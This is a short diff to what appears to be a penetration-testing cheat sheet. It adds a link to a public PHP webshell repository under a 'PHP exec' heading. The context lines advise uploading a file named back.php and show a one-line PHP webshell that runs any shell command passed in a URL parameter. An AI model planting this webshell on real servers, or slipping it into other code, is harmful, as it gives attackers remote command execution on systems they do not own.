@@ -371,6 +371,7 @@ phpinfo()
 ls
 
 ## PHP exec
+- [Very good](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
 - upload file/code back.php
 ```
 <?php echo shell_exec($_GET['c']);?>
